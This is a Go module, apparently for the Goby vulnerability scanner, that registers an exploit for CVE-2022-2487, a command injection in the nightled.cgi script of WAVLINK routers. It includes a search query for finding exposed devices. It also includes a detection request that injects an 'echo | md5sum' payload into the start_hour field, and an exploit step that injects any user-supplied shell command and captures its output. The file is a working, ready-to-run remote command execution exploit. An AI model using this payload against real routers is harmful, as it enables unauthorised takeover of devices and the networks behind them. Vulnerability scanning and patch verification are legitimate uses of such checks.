package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "wavlink nightled.cgi command execution(CVE-2022-2487)",
    "Description": "<p>WAVLINK is a router developed by China Ruiyin Technology (WAVLINK). There is a command execution vulnerability in the system nightled.cgi file, through which an attacker can obtain server privileges. The firmware version is WL-WN535K2/K3, including models WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4, etc.</p>",
    "Product": "wavlink",
    "Homepage": "https://www.wavlink.com",
    "DisclosureDate": "2022-07-05",
    "Author": "",
    "FofaQuery": "body=\"firstFlage\"",
    "GobyQuery": "body=\"firstFlage\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute system commands to gain server privileges.</p>",
    "Recommendation": "<p>Contact the manufacturer for a repair solution: <a href=\"https://www.wavlink.com\">https://www.wavlink.com</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/nightled.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "page=night_led&start_hour=;echo%20abc%20|%20md5sum;"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0bee89b07a248e27c83fc3d5951213c1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/nightled.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "page=night_led&start_hour=;{{{cmd}}};"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)HTTP/1.1 200 OK"
            ]
        }
    ],
    "Tags": [
        "Internet of Things",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-2487"
    ],
    "CNNVD": [
        "CNNVD-202207-2018"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "wavlink nightled.cgi命令执行漏洞（CVE-2022-2487）",
            "Product": "WAVLINK",
            "Description": "<p>WAVLINK是中国睿因科技（WAVLINK）公司开发的一款路由器。 系统nightled.cgi文件存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。固件版本为WL-WN535K2/K3， 包含型号WN530HG4、WN531G3、WN572HG3、WN535G3、WN575A4等。<br></p>",
            "Recommendation": "<p>联系厂商获取修复方案：<a href=\"https://www.wavlink.com\">https://www.wavlink.com</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞执行系统命令获取服务器权限。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "物联网"
            ]
        },
        "EN": {
            "Name": "wavlink nightled.cgi command execution(CVE-2022-2487)",
            "Product": "wavlink",
            "Description": "<p>WAVLINK is a router developed by China Ruiyin Technology (WAVLINK). There is a command execution vulnerability in the system nightled.cgi file, through which an attacker can obtain server privileges. The firmware version is WL-WN535K2/K3, including models WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4, etc.</p>",
            "Recommendation": "<p>Contact the manufacturer for a repair solution: <a href=\"https://www.wavlink.com\">https://www.wavlink.com</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute system commands to gain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Internet of Things",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}